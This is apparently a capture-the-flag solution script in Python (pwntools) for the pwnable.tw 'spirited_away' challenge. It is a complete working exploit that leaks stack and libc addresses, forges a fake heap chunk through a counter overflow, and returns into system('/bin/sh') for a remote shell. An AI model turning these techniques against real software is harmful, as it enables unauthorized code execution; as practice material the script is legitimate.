#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./spirited_away_patched')
libc = ELF('./libc_32.so.6')
ld = ELF('./ld-2.23.so')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
else:
    p = remote('chall.pwnable.tw', 10204)

def survey(name, age, reason, comment):
    sa('name: ', name)
    sla('age: ', str(age))
    sa('movie? ', reason)
    sa('comment: ', comment)
    ru('Name: ')
    name = ru('\n')[:-1]
    ru('Age: ')
    age = ru('\n')[:-1]
    ru('Reason: ')
    reason = ru('\n')[:-1]
    ru('Comment: ')
    comment = ru('\n\n')[:-2]
    ru('as we can\n\n')
    return name, age, reason, comment

def choose(c):
    sa('comment? <y/n>: ', c)

# leak stack & libc
[name, age, reason, comment] = survey('A', 10, 'A' * 0x50, 'A')
stack = uu32(reason[0x50:0x54])
info('stack = ' + hex(stack))
libc_base = uu32(reason[0x58:0x5c]) - 0x1b0d60
info('libc_base = ' + hex(libc_base))
system = libc_base + libc.sym['system']
info('system = ' + hex(system))
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
info('binsh = ' + hex(binsh))
choose('y')

# set cnt >= 100 to bof
#context.log_level = 'debug'
context.log_level = 'warning'
#gdb.attach(p, 'b *0x08048859\nc')
for i in range(9):
    survey('B', 20, 'B'.ljust(0x50, '\x00'), 'B')
    choose('y')
for i in range(10, 100): # nbytes becomes 0
    survey('', 20, 'B'.ljust(0x50, '\x00'), '')
    choose('y')
context.log_level = 'debug'
survey('B', 20, 'B'.ljust(0x50, '\x00'), 'B') # nbytes becomes ord('n')=0x6e
choose('y')

# overflow a fake chunk at reason to control eip
#gdb.attach(p, 'x/wx 0x0804A070')
#gdb.attach(p, 'b *0x080488C9\nc')
survey('C', 30, 'C' * 8 + up32(0) + up32(0x41) + 'C' * 0x3c + up32(0x41), 'C' * 0x50 + up32(30) + up32(stack - 0x60))
choose('y') # free a fake chunk
#survey('/bin/sh\x00'.ljust(0x40, 'D') + up32(0xcafebabe) + up32(system) + up32(0xdeadbeef) + up32(stack - 0x60), 40, 'D', 'D')
survey('/bin/sh\x00'.ljust(0x40, 'D') + up32(0xcafebabe) + up32(system) + up32(0xdeadbeef) + up32(binsh), 40, 'D', 'D')
#gdb.attach(p, 'b *0x080488D3\nc')
choose('n')

p.interactive()

